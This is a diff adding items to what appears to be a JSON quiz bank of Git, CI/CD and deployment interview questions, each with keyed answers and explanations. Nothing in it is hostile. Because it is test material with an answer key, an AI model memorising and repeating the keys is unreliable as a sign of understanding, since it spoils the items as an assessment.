+        "Scaling the database up for a migration, then back down afterwards",
+        "Adding the new schema alongside the old, moving code over, then removing the old",
+        "Running the migration on a read replica first, then promoting that replica to primary",
+        "Compressing a table before a migration so it finishes faster"
+      ],
+      "answer": 1,
+      "why": "To rename a column safely you add the new one, write both and backfill, switch reads, and only drop the old column in a later release. Every intermediate state works with both the old and new code, which is what rolling deploys and rollbacks need.",
+      "tags": ["deployment", "migrations"],
+      "level": 3,
+      "asked": "Asked for zero-downtime deploy discussions; naming the steps is the strong answer."
+    },
+    {
+      "id": "gt-171",
+      "q": "In GitHub Actions, what is a job-level `if: github.ref == 'refs/heads/main'` on the deploy job for?",
+      "choices": [
+        "It makes the job run first, before any other job in the workflow",
+        "It lets the job read secrets that are otherwise hidden from branches",
+        "It makes the deploy job run only for pushes to main",
+        "It rebases the branch onto main before the job starts"
+      ],
+      "answer": 2,
+      "why": "The condition is evaluated before the job starts; on PRs and other branches the deploy job is skipped while build and test still run. Combining it with an environment protection rule gives a second guard for production.",
+      "tags": ["ci", "cd", "github-actions"],
+      "level": 1,
+      "asked": "Everyday pipeline authoring; shows you keep deploys off feature branches."
+    },
+    {
+      "id": "gt-172",
+      "q": "Your GitHub Actions minutes bill doubled. Which change usually saves the most without losing signal?",
+      "choices": [
+        "Running the full suite only once a night instead of on every PR",
+        "Cancelling superseded runs, caching dependencies and adding job timeouts",
+        "Moving every job onto the largest runner size so each run finishes sooner",
+        "Removing the lint and type-check steps, which rarely fail"
+      ],
+      "answer": 1,
+      "why": "Superseded runs on busy PRs, cold dependency installs and hung jobs are the usual waste. Nightly-only testing delays feedback, and removing cheap checks saves little while losing the fastest signals.",
+      "tags": ["ci", "process"],
+      "level": 2,
+      "asked": "Tests cost awareness and knowledge of the cheap wins."
+    },
+    {
+      "id": "gt-173",
+      "q": "What does `git maintenance start` (or the automatic `git gc`) do for a large local repository?",
+      "choices": [
+        "Deletes local branches that were merged more than 30 days ago",
+        "Repacks objects and updates the commit graph in the background",
+        "Pushes unpushed commits to a backup remote on a schedule",
+        "Rewrites history to strip out any files larger than 100 MB from old commits"
+      ],
+      "answer": 1,
+      "why": "Maintenance tasks pack loose objects, prefetch from remotes and write the commit-graph file so log, status and fetch stay fast. They never delete branches or rewrite history; only unreachable objects past their expiry are pruned.",
+      "tags": ["git", "git-internals"],
+      "level": 3,
+      "asked": "A niche question that shows curiosity about why Git stays fast."
+    },
+    {
+      "id": "gt-174",
+      "q": "You accidentally ran `git stash drop` on a stash you needed. Is it recoverable?",
+      "choices": [
+        "No, dropping a stash deletes its commit objects immediately",
+        "Yes, but only with `git stash undo` within five minutes",
+        "Yes, via `git reflog stash`, which keeps a record of every dropped stash entry",
+        "Usually, since `git fsck --unreachable` can find the dangling stash commit"
+      ],
+      "answer": 3,
+      "why": "A stash is stored as commits; dropping removes the ref but the objects remain until garbage collection. `git fsck --unreachable | grep commit` (or the SHA printed when you dropped it) lets you `git stash apply <sha>`. There is no `stash undo`, and the stash reflog loses the dropped entry.",
+      "tags": ["git", "stash", "recovery"],
+      "level": 3,
+      "asked": "Deep recovery knowledge; interviewers use it to see if you understand stashes are commits."
+    },
+    {
+      "id": "gt-175",
+      "q": "What does `git switch -` do?",
+      "choices": [
+        "Switches to the branch you had checked out before the current one",
+        "Creates a new branch named after the current commit's SHA",
+        "Detaches HEAD at the current commit so you can experiment",
+        "Switches to the default branch configured for the remote"
+      ],
+      "answer": 0,
+      "why": "Like `cd -` in a shell, `-` means the previously checked-out branch (`@{-1}`), so you can bounce between a feature branch and main quickly. It does not create or detach anything.",
+      "tags": ["git"],
+      "level": 1,
+      "asked": "A small fluency signal; people who use Git all day know the shortcuts."
     }
   ]
 }
